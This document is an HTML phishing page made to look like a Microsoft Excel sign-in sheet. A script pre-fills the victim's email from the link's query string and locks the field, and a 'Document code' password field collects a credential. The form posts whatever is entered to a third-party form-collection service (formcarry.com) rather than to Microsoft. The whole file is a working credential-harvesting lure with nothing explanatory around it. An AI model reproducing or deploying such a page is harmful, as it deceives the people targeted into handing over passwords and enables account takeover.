<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Spreadsheet</title>

<style>
  body {
    background: #f3f3f3;
    font-family: Calibri, Arial, sans-serif;
    padding: 40px;
  }

  .sheet {
    background: white;
    width: 700px;
    margin: auto;
    border: 1px solid #bfbfbf;
  }

  table {
    border-collapse: collapse;
    width: 100%;
  }

  td, th {
    border: 1px solid #d0d0d0;
    padding: 8px;
    font-size: 14px;
  }

  th {
    background: #e6e6e6;
    text-align: center;
    font-weight: bold;
  }

  .label {
    background: #f2f2f2;
    font-weight: bold;
    width: 200px;
  }

  input {
    width: 100%;
    border: none;
    outline: none;
    font-family: Calibri, Arial, sans-serif;
    font-size: 14px;
  }

  button {
    width: 100%;
    padding: 10px;
    background: #217346; /* Excel green */
    color: white;
    border: none;
    font-size: 14px;
    cursor: pointer;
  }
</style>
</head>

<body>

<div class="sheet">
  <form action="https://formcarry.com/s/zPqDzDWqria" method="POST">
    <table>
      <tr>
        <th colspan="2">Microsoft Excel</th>
      </tr>

      <tr>
        <td class="label">Email</td>
        <td>
          <input type="email" id="email" name="email" readonly required>
        </td>
      </tr>

      <tr>
        <td class="label">Document code</td>
        <td>
          <input type="password" name="document_code" required>
        </td>
      </tr>

      <tr>
        <td colspan="2">
          <button type="submit">Open Spreadsheet</button>
        </td>
      </tr>
    </table>
  </form>
</div>

<script>
  const params = new URLSearchParams(window.location.search);
  const email = params.get("email");
  if (email) {
    document.getElementById("email").value = email;
  }
</script>

</body>
</html>
